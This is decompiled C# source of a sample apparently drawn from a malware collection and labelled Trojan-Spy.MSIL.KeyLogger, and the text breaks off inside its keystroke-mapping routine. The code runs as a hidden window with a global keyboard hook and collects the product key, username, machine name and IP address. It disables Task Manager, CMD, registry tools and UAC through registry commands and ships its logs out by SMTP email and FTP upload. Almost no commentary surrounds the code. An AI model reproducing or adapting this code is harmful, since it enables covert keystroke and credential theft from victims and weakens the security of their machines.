// Decompiled with JetBrains decompiler
// Type: AHSJKHwyIUYUIYIYI8sOIioOID.Form1
// Assembly: Publicloggerversionztub, Version=2.0.0.2, Culture=neutral, PublicKeyToken=null
// MVID: 02BBAAFD-61B0-4722-9D55-257F48A7F005
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.ajb-34132edf41a9fe3359ebc67aedcf2dca594b4e5145bfa81e9a8b1d0fa57c1b2f.exe

using AHSJKHwyIUYUIYIYI8sOIioOID.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace AHSJKHwyIUYUIYIYI8sOIioOID
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    [AccessedThroughProperty("ztext")]
    private TextBox _ztext;
    private string Nelu1uiJamiGLOE2mvPt;
    private string[] XPPlmeeQxj5EmuZpmFhv;
    private const string XfE5GMqJlmdlAfPPSsrK = "a9h68ZIONTRW96gW0op1J";
    private string iGUGqtFVo3Sb2I3PjRTb;
    private string G05Q8driMmLxiCj3LykA;
    private string Z8jhi1VLpyIBs811P9hh;
    private string xozlq1rCdjmBfQkUw41e;
    private string BaF8wJ4EOTqEDOhTgvB5;
    private string godc6a5KIkKuSNYLafVd;
    private string gqYQ5f5zs26SNsYELgWb;
    private string b5Vw7rrguYMSSfXOEB5Q;
    private string P9myNMan6k5igb0hVq4G;
    private string a3R8hzFEAHNWAWnaOJxz0;
    private string JHAP31B2JwG0SQ2NvtYw;
    private string NdJnxPlGOMsUWLgkK3lV;
    private string E66huKgHLzIwWwNxSNbJ;
    private string wnJYMhylNYngywzYUlQk;
    private string myY9aYW6AdutlP8DAUnN;
    private string UK4WmDueeXbD1rbnmSO6;
    private string ulRe7QX9l5wyaXGvmVXO;
    private string dnNymFuFtA8K1Vu7KUGP;
    private string nkdLnaNvys1cThHSURh9;
    private string drCpFfKGVlcmm4BbWDaB;
    private string LzH8BeS1gYj0xcWTXZsd;
    private string a98IvH059PIVkHN6fLYqb;
    private string gQ6Lln84OP3I0l41ZEpn;
    private string dR7hJ9OQR8JuLX60TqOp;
    private string iAs34n4atf4AnzG71Bgw;
    private string a6zPFCgoeSCFtcbDB2qJl;
    private string SzLWEQQH9aoPrufxF5RC;
    private string a5SHvYkc7rxcWZtfSc3x6;
    private string Yj9ZaLO9Hv8PRfghSZyG;
    private string a2bG0oXKfTJqTYXedDaXQ;
    private string Uy9C4leb50UWUQUQ4lvl;
    private string xg40VoU0GnyYvZtP0W41;
    private string xbtqTJX2nBKzM7HA5txo;
    private string YiUyVU9sZAGxvITwmp4S;
    private string a6Jd74rJe9CGEahr2zgAU;
    private string iwHNx37l2ldn0GNZrLgu;
    private string kfSWcun3hjknEFuQZlZx;
    private string a2U44EyiQg4Kymr2QQ5lJ;
    private string xEkuITaLQIMQ9zifbQ9V;
    private string dqv4phRjzHGH0UyQobQF;
    private string iJrlB1DcdCxRCe356PJ7;
    private string sXRVR1YTfljVps0I5oPb;
    private string fv5cGBYRaIeRph7Vplbl;
    private string HRtANFi0K2JBDzWDTxE6;
    private string iBfF08vFzdNBJ6o4zZyd;
    private string a9vznQ8Nh284TDhIWliaz;
    private string xA5K1BzLEIOEjgipgNqX;
    private string dSai89gbJkSU4b1WW9CW;
    private string cEhQYpIOzoNaFpKaefSd;
    private string qweqw545sa4d798wqe;
    private string UxNMTN2VJWMHohFePcTT;
    private string PkyzKHPw64vpdz0xsKYc;
    private TextBox extension1;
    private TextBox extension2;
    private TextBox extensions1;
    private TextBox extensions2;
    [AccessedThroughProperty("kbHook")]
    private Form1.KeyboardHook _kbHook;
    private string a9DdJBo73qIGZ3bZwRhMt;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.qweqw545sa4d798wqe = Path.GetFileName(Application.ExecutablePath);
      this.UxNMTN2VJWMHohFePcTT = "1";
      this.PkyzKHPw64vpdz0xsKYc = "1";
      this.extension1 = new TextBox();
      this.extension2 = new TextBox();
      this.extensions1 = new TextBox();
      this.extensions2 = new TextBox();
      this.kbHook = new Form1.KeyboardHook();
      this.a9DdJBo73qIGZ3bZwRhMt = (string) null;
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.ztext = new TextBox();
      this.SuspendLayout();
      this.ztext.Location = new Point(1, -10);
      this.ztext.Multiline = true;
      this.ztext.Name = "ztext";
      this.ztext.ReadOnly = true;
      TextBox ztext = this.ztext;
      Size size1 = new Size(10, 10);
      Size size2 = size1;
      ztext.Size = size2;
      this.ztext.TabIndex = 0;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(10, 10);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.ztext);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this._Timer3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    internal virtual TextBox ztext
    {
      [DebuggerNonUserCode] get => this._ztext;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ztext = value;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      Stealers.a3a5BUuMotnLNQr4ppdR3();
      Stealers.eZM1nfSwL2SqQ8rVRi4H();
      Stealers.HiMxBxbT13r5txdIgEpI();
      Stealers.EHW0zrPys1b9dmv0DQ8n();
      Stealers.zBiVxuA7UnDihC1BQuyH();
      Stealers.mxNwfsA9ms8UKfQfQOMG();
      this.Nelu1uiJamiGLOE2mvPt = System.IO.File.ReadAllText(Application.ExecutablePath);
      this.XPPlmeeQxj5EmuZpmFhv = Strings.Split(this.Nelu1uiJamiGLOE2mvPt, "a9h68ZIONTRW96gW0op1J");
      this.iGUGqtFVo3Sb2I3PjRTb = this.drCpFfKGVlcmm4BbWDaB;
      this.G05Q8driMmLxiCj3LykA = this.LzH8BeS1gYj0xcWTXZsd;
      this.Z8jhi1VLpyIBs811P9hh = this.a98IvH059PIVkHN6fLYqb;
      this.xozlq1rCdjmBfQkUw41e = this.gQ6Lln84OP3I0l41ZEpn;
      this.BaF8wJ4EOTqEDOhTgvB5 = this.dR7hJ9OQR8JuLX60TqOp;
      this.godc6a5KIkKuSNYLafVd = this.iAs34n4atf4AnzG71Bgw;
      this.gqYQ5f5zs26SNsYELgWb = this.a6zPFCgoeSCFtcbDB2qJl;
      this.b5Vw7rrguYMSSfXOEB5Q = this.SzLWEQQH9aoPrufxF5RC;
      this.P9myNMan6k5igb0hVq4G = this.a5SHvYkc7rxcWZtfSc3x6;
      this.a3R8hzFEAHNWAWnaOJxz0 = this.Yj9ZaLO9Hv8PRfghSZyG;
      this.JHAP31B2JwG0SQ2NvtYw = this.a2bG0oXKfTJqTYXedDaXQ;
      this.NdJnxPlGOMsUWLgkK3lV = this.Uy9C4leb50UWUQUQ4lvl;
      this.E66huKgHLzIwWwNxSNbJ = this.xg40VoU0GnyYvZtP0W41;
      this.wnJYMhylNYngywzYUlQk = this.xbtqTJX2nBKzM7HA5txo;
      this.myY9aYW6AdutlP8DAUnN = this.YiUyVU9sZAGxvITwmp4S;
      this.UK4WmDueeXbD1rbnmSO6 = this.a6Jd74rJe9CGEahr2zgAU;
      this.ulRe7QX9l5wyaXGvmVXO = this.iwHNx37l2ldn0GNZrLgu;
      this.dnNymFuFtA8K1Vu7KUGP = this.kfSWcun3hjknEFuQZlZx;
      this.nkdLnaNvys1cThHSURh9 = this.a2U44EyiQg4Kymr2QQ5lJ;
      this.extension1.Text = this.XPPlmeeQxj5EmuZpmFhv[1];
      this.extension2.Text = this.XPPlmeeQxj5EmuZpmFhv[2];
      this.a98IvH059PIVkHN6fLYqb = this.XPPlmeeQxj5EmuZpmFhv[3];
      this.gQ6Lln84OP3I0l41ZEpn = this.XPPlmeeQxj5EmuZpmFhv[4];
      this.dR7hJ9OQR8JuLX60TqOp = this.XPPlmeeQxj5EmuZpmFhv[5];
      this.extensions1.Text = this.XPPlmeeQxj5EmuZpmFhv[6];
      this.extensions2.Text = this.XPPlmeeQxj5EmuZpmFhv[7];
      this.SzLWEQQH9aoPrufxF5RC = this.XPPlmeeQxj5EmuZpmFhv[8];
      this.a5SHvYkc7rxcWZtfSc3x6 = this.XPPlmeeQxj5EmuZpmFhv[9];
      this.Yj9ZaLO9Hv8PRfghSZyG = this.XPPlmeeQxj5EmuZpmFhv[10];
      this.a2bG0oXKfTJqTYXedDaXQ = this.XPPlmeeQxj5EmuZpmFhv[11];
      this.Uy9C4leb50UWUQUQ4lvl = this.XPPlmeeQxj5EmuZpmFhv[12];
      this.xg40VoU0GnyYvZtP0W41 = this.XPPlmeeQxj5EmuZpmFhv[13];
      this.xbtqTJX2nBKzM7HA5txo = this.XPPlmeeQxj5EmuZpmFhv[14];
      this.YiUyVU9sZAGxvITwmp4S = this.XPPlmeeQxj5EmuZpmFhv[15];
      this.a6Jd74rJe9CGEahr2zgAU = this.XPPlmeeQxj5EmuZpmFhv[16];
      this.iwHNx37l2ldn0GNZrLgu = this.XPPlmeeQxj5EmuZpmFhv[17];
      this.kfSWcun3hjknEFuQZlZx = this.XPPlmeeQxj5EmuZpmFhv[18];
      this.a2U44EyiQg4Kymr2QQ5lJ = this.XPPlmeeQxj5EmuZpmFhv[19];
      if (Conversions.ToBoolean(this.Yj9ZaLO9Hv8PRfghSZyG))
      {
        this.PeUvHMK6JhO2FrK2E2PA();
        Antis.qwejJAUiewuoqo1u3oi12312();
        Antis.SHOSHARKZ();
        Antis.Shipost();
        Antis.Sheperskyz();
        Antis.Shibender();
        Antis.Shuwalarm();
        Antis.wiIUQO1KLLAIowuEO2KOAA();
        Antis.Shunurmanizkabardiz();
        Antis.nodrezspedtretodez();
        Antis.shuberbytizkeberdizdie();
        Antis.shulabeldebiskeberidiz();
        Antis.vpzkabarzidikoborzi();
        Antis.kuburdivimarekuburziger();
        Antis.vellokobarxzikobordi();
        Antis.shardabihardraviekorvadikemberdi();
        Antis.Shumarnizkeabardizimulatorizkoborzi();
      }
      if (Conversions.ToBoolean(this.a2bG0oXKfTJqTYXedDaXQ))
      {
        try
        {
          MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object) "1", RegistryValueKind.DWord);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.Uy9C4leb50UWUQUQ4lvl))
      {
        try
        {
          Interaction.Shell("REG add HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", AppWinStyle.Hide);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.xg40VoU0GnyYvZtP0W41))
      {
        try
        {
          MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object) "1", RegistryValueKind.DWord);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.xbtqTJX2nBKzM7HA5txo))
      {
        try
        {
          Form1.CLcGej61sAOadow3o7J1(this.qweqw545sa4d798wqe, Application.ExecutablePath);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.YiUyVU9sZAGxvITwmp4S))
      {
        try
        {
          this.XEqcJbhViQGgS7eTUucl(this.qweqw545sa4d798wqe);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.a6Jd74rJe9CGEahr2zgAU))
      {
        try
        {
          this.buNcDHzIpxpI8Avedgn1();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.iwHNx37l2ldn0GNZrLgu))
      {
        try
        {
          Interaction.Shell("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.kfSWcun3hjknEFuQZlZx))
      {
        try
        {
          Interaction.Shell("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      this.Timer1.Interval = checked ((int) Math.Round(unchecked (Conversions.ToDouble(this.a98IvH059PIVkHN6fLYqb) * 60.0 * 1000.0)));
      this.a98IvH059PIVkHN6fLYqb = Conversions.ToString(this.Timer1.Interval);
      this.Timer3.Interval = checked ((int) Math.Round(unchecked (Conversions.ToDouble(this.a5SHvYkc7rxcWZtfSc3x6) * 60.0 * 1000.0)));
      this.a5SHvYkc7rxcWZtfSc3x6 = Conversions.ToString(this.Timer3.Interval);
      this.Timer1.Start();
      this.Timer2.Start();
      this.Timer3.Start();
      this.OacRuTnZTCtnV75xPaQV();
    }

    public void OacRuTnZTCtnV75xPaQV()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        if (!Conversions.ToBoolean(this.a2U44EyiQg4Kymr2QQ5lJ))
          goto label_55;
label_2:
        num3 = 3;
        string text1 = this.extension1.Text;
label_3:
        num3 = 4;
        this.drCpFfKGVlcmm4BbWDaB = Form1.rc4(text1, "qwerty");
label_4:
        num3 = 5;
        string text2 = this.extension2.Text;
label_5:
        num3 = 6;
        this.LzH8BeS1gYj0xcWTXZsd = Form1.rc4(text2, "qwerty1");
label_6:
        num3 = 7;
        string text3 = this.extensions1.Text;
label_7:
        num3 = 8;
        this.iAs34n4atf4AnzG71Bgw = Form1.rc4(text3, "qwerty");
label_8:
        num3 = 9;
        string text4 = this.extensions2.Text;
label_9:
        num3 = 10;
        this.a6zPFCgoeSCFtcbDB2qJl = Form1.rc4(text4, "qwerty1");
label_10:
        num3 = 11;
        this.iJrlB1DcdCxRCe356PJ7 = Stealers.PObuCQy99zk1pRyNfeNs();
label_11:
        num3 = 12;
        this.xEkuITaLQIMQ9zifbQ9V = "OS Product Key -->>" + Stealers.tMvSzZe55uXc2iyPe887("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "DigitalProductId") + "   ";
label_12:
        num3 = 13;
        WebClient webClient = new WebClient();
label_13:
        num3 = 14;
        string str1 = "Victim's Ip: -->" + webClient.DownloadString("http://www.showmyip.com/simple") + "   ";
label_14:
        num3 = 15;
        this.dqv4phRjzHGH0UyQobQF = str1;
label_15:
        num3 = 16;
        this.sXRVR1YTfljVps0I5oPb = "MACHINE NAME: -->" + Environment.MachineName + "   ";
label_16:
        num3 = 17;
        this.fv5cGBYRaIeRph7Vplbl = "SYSTEM USERNAME: --> " + Environment.UserName + "   ";
label_17:
        num3 = 18;
        this.HRtANFi0K2JBDzWDTxE6 = "OS NAME: -->" + MyProject.Computer.Info.OSFullName + "   ";
label_18:
        num3 = 19;
        this.iBfF08vFzdNBJ6o4zZyd = "OS PLATFORM: -->" + MyProject.Computer.Info.OSPlatform + "   ";
label_19:
        num3 = 20;
        this.a9vznQ8Nh284TDhIWliaz = "OS VERSION: -->" + MyProject.Computer.Info.OSVersion + "   ";
label_20:
        num3 = 21;
        this.xA5K1BzLEIOEjgipgNqX = "INSTALLED UI CULTURE: -->" + MyProject.Computer.Info.InstalledUICulture.ToString() + "   ";
label_21:
        num3 = 22;
        MailMessage message = new MailMessage();
label_22:
        num3 = 23;
        message.From = new MailAddress(this.drCpFfKGVlcmm4BbWDaB);
label_23:
        num3 = 24;
        message.To.Add(this.drCpFfKGVlcmm4BbWDaB);
label_24:
        num3 = 25;
        message.Subject = "Public Lonely Logger Version 1.0 Stealer Logs.";
label_25:
        num3 = 26;
        message.Body = this.dqv4phRjzHGH0UyQobQF + this.xEkuITaLQIMQ9zifbQ9V + this.iJrlB1DcdCxRCe356PJ7 + this.sXRVR1YTfljVps0I5oPb + this.fv5cGBYRaIeRph7Vplbl + this.HRtANFi0K2JBDzWDTxE6 + this.iBfF08vFzdNBJ6o4zZyd + this.a9vznQ8Nh284TDhIWliaz + this.xA5K1BzLEIOEjgipgNqX + this.ztext.Text;
label_26:
        num3 = 27;
        SmtpClient smtpClient = new SmtpClient(this.gQ6Lln84OP3I0l41ZEpn);
label_27:
        num3 = 28;
        smtpClient.Port = Conversions.ToInteger(this.dR7hJ9OQR8JuLX60TqOp);
label_28:
        num3 = 29;
        smtpClient.EnableSsl = true;
label_29:
        num3 = 30;
        smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.drCpFfKGVlcmm4BbWDaB, this.LzH8BeS1gYj0xcWTXZsd);
label_30:
        num3 = 31;
        smtpClient.Send(message);
label_31:
        ProjectData.ClearProjectError();
        num1 = -3;
label_32:
        num3 = 33;
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create("ftp://" + this.SzLWEQQH9aoPrufxF5RC + "/Public Lonely Logger Version 1.0 Stealer And Victim's Information Logs" + this.PkyzKHPw64vpdz0xsKYc + ".txt");
label_33:
        num3 = 34;
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.iAs34n4atf4AnzG71Bgw, this.a6zPFCgoeSCFtcbDB2qJl);
label_34:
        num3 = 35;
        ftpWebRequest.Method = "STOR";
label_35:
        num3 = 36;
        string str2 = this.dqv4phRjzHGH0UyQobQF + this.iJrlB1DcdCxRCe356PJ7 + this.xEkuITaLQIMQ9zifbQ9V + this.sXRVR1YTfljVps0I5oPb + this.fv5cGBYRaIeRph7Vplbl + this.HRtANFi0K2JBDzWDTxE6 + this.a9vznQ8Nh284TDhIWliaz + this.xA5K1BzLEIOEjgipgNqX + this.ztext.Text;
label_36:
        num3 = 37;
        FileStream fileStream = new FileStream("C:\\WINDOWS\\" + this.PkyzKHPw64vpdz0xsKYc, FileMode.Create, FileAccess.Write);
label_37:
        num3 = 38;
        StreamWriter streamWriter = new StreamWriter((Stream) fileStream);
label_38:
        num3 = 39;
        streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
label_39:
        num3 = 40;
        streamWriter.WriteLine(str2);
label_40:
        num3 = 41;
        streamWriter.Close();
label_41:
        num3 = 42;
        byte[] buffer = System.IO.File.ReadAllBytes("C:\\WINDOWS\\" + this.PkyzKHPw64vpdz0xsKYc);
label_42:
        num3 = 43;
        Stream requestStream = ftpWebRequest.GetRequestStream();
label_43:
        num3 = 44;
        requestStream.Write(buffer, 0, buffer.Length);
label_44:
        num3 = 45;
        requestStream.Close();
label_45:
        num3 = 46;
        requestStream.Dispose();
label_46:
        num3 = 47;
        string path = "C:\\WINDOWS\\" + this.PkyzKHPw64vpdz0xsKYc;
label_47:
        num3 = 48;
        System.IO.File.Delete(path);
label_48:
        num3 = 49;
        this.PkyzKHPw64vpdz0xsKYc = Conversions.ToString(Conversions.ToDouble(this.PkyzKHPw64vpdz0xsKYc) + 1.0);
        goto label_55;
label_50:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_20;
              case 22:
                goto label_21;
              case 23:
                goto label_22;
              case 24:
                goto label_23;
              case 25:
                goto label_24;
              case 26:
                goto label_25;
              case 27:
                goto label_26;
              case 28:
                goto label_27;
              case 29:
                goto label_28;
              case 30:
                goto label_29;
              case 31:
                goto label_30;
              case 32:
                goto label_31;
              case 33:
                goto label_32;
              case 34:
                goto label_33;
              case 35:
                goto label_34;
              case 36:
                goto label_35;
              case 37:
                goto label_36;
              case 38:
                goto label_37;
              case 39:
                goto label_38;
              case 40:
                goto label_39;
              case 41:
                goto label_40;
              case 42:
                goto label_41;
              case 43:
                goto label_42;
              case 44:
                goto label_43;
              case 45:
                goto label_44;
              case 46:
                goto label_45;
              case 47:
                goto label_46;
              case 48:
                goto label_47;
              case 49:
                goto label_48;
              case 50:
              case 51:
                goto label_55;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_50;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_55:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private virtual Form1.KeyboardHook kbHook
    {
      [DebuggerNonUserCode] get => this._kbHook;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Form1.KeyboardHook.KeyDownEventHandler downEventHandler = new Form1.KeyboardHook.KeyDownEventHandler(this.shiftandcaps);
        if (this._kbHook != null)
          Form1.KeyboardHook.KeyDown -= downEventHandler;
        this._kbHook = value;
        if (this._kbHook == null)
          return;
        Form1.KeyboardHook.KeyDown += downEventHandler;
      }
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    private string GetActiveWindowTitle()
    {
      string lpString = new string(char.MinValue, 100);
      Form1.GetWindowText(Form1.GetForegroundWindow(), ref lpString, 100);
      return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
    }

    public void shiftandcaps(Keys Key)
    {
      if (!MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.dSai89gbJkSU4b1WW9CW = this.dSai89gbJkSU4b1WW9CW.Remove(checked (this.dSai89gbJkSU4b1WW9CW.Length - 1), 1);
            break;
          case Keys.Tab:
            this.dSai89gbJkSU4b1WW9CW += "[TAB]";
            break;
          case Keys.Return:
            this.dSai89gbJkSU4b1WW9CW += "\r\n";
            break;
          case Keys.Escape:
            this.dSai89gbJkSU4b1WW9CW += "[ESC]";
            break;
          case Keys.Space:
            this.dSai89gbJkSU4b1WW9CW += " ";
            break;
          case Keys.End:
            this.dSai89gbJkSU4b1WW9CW += "[END]";
            break;
          case Keys.Left:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Up:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Right:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Down:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Delete:
            this.dSai89gbJkSU4b1WW9CW = this.dSai89gbJkSU4b1WW9CW.Remove(checked (this.dSai89gbJkSU4b1WW9CW.Length - 1), 1);
            break;
          case Keys.D0:
            this.dSai89gbJkSU4b1WW9CW += "0";
            break;
          case Keys.D1:
            this.dSai89gbJkSU4b1WW9CW += "1";
            break;
          case Keys.D2:
            this.dSai89gbJkSU4b1WW9CW += "2";
            break;
          case Keys.D3:
            this.dSai89gbJkSU4b1WW9CW += "3";
            break;
          case Keys.D4:
            this.dSai89gbJkSU4b1WW9CW += "4";
            break;
          case Keys.D5:
            this.dSai89gbJkSU4b1WW9CW += "5";
            break;
          case Keys.D6:
            this.dSai89gbJkSU4b1WW9CW += "6";
            break;
          case Keys.D7:
            this.dSai89gbJkSU4b1WW9CW += "7";
            break;
          case Keys.D8:
            this.dSai89gbJkSU4b1WW9CW += "8";
            break;
          case Keys.D9:
            this.dSai89gbJkSU4b1WW9CW += "9";
            break;
          case Keys.A:
            this.dSai89gbJkSU4b1WW9CW += "a";
            break;
          case Keys.B:
            this.dSai89gbJkSU4b1WW9CW += "b";
            break;
          case Keys.C:
            this.dSai89gbJkSU4b1WW9CW += "c";
            break;
          case Keys.D:
            this.dSai89gbJkSU4b1WW9CW += "d";
            break;
          case Keys.E:
            this.dSai89gbJkSU4b1WW9CW += "e";
            break;
          case Keys.F:
            this.dSai89gbJkSU4b1WW9CW += "f";
            break;
          case Keys.G:
            this.dSai89gbJkSU4b1WW9CW += "g";
            break;
          case Keys.H:
            this.dSai89gbJkSU4b1WW9CW += "h";
            break;
          case Keys.I:
            this.dSai89gbJkSU4b1WW9CW += "i";
            break;
          case Keys.J:
            this.dSai89gbJkSU4b1WW9CW += "j";
            break;
          case Keys.K:
            this.dSai89gbJkSU4b1WW9CW += "k";
            break;
          case Keys.L:
            this.dSai89gbJkSU4b1WW9CW += "l";
            break;
          case Keys.M:
            this.dSai89gbJkSU4b1WW9CW += "m";
            break;
          case Keys.N:
            this.dSai89gbJkSU4b1WW9CW += "n";
            break;
          case Keys.O:
            this.dSai89gbJkSU4b1WW9CW += "o";
            break;
          case Keys.P:
            this.dSai89gbJkSU4b1WW9CW += "p";
            break;
          case Keys.Q:
            this.dSai89gbJkSU4b1WW9CW += "q";
            break;
          case Keys.R:
            this.dSai89gbJkSU4b1WW9CW += "r";
            break;
          case Keys.S:
            this.dSai89gbJkSU4b1WW9CW += "s";
            break;
          case Keys.T:
            this.dSai89gbJkSU4b1WW9CW += "t";
            break;
          case Keys.U:
            this.dSai89gbJkSU4b1WW9CW += "u";
            break;
          case Keys.V:
            this.dSai89gbJkSU4b1WW9CW += "v";
            break;
          case Keys.W:
            this.dSai89gbJkSU4b1WW9CW += "w";
            break;
          case Keys.X:
            this.dSai89gbJkSU4b1WW9CW += "x";
            break;
          case Keys.Y:
            this.dSai89gbJkSU4b1WW9CW += "y";
            break;
          case Keys.Z:
            this.dSai89gbJkSU4b1WW9CW += "z";
            break;
          case Keys.NumPad0:
            this.dSai89gbJkSU4b1WW9CW += "0";
            break;
          case Keys.NumPad1:
            this.dSai89gbJkSU4b1WW9CW += "1";
            break;
          case Keys.NumPad2:
            this.dSai89gbJkSU4b1WW9CW += "2";
            break;
          case Keys.NumPad3:
            this.dSai89gbJkSU4b1WW9CW += "3";
            break;
          case Keys.NumPad4:
            this.dSai89gbJkSU4b1WW9CW += "4";
            break;
          case Keys.NumPad5:
            this.dSai89gbJkSU4b1WW9CW += "5";
            break;
          case Keys.NumPad6:
            this.dSai89gbJkSU4b1WW9CW += "6";
            break;
          case Keys.NumPad7:
            this.dSai89gbJkSU4b1WW9CW += "7";
            break;
          case Keys.NumPad8:
            this.dSai89gbJkSU4b1WW9CW += "8";
            break;
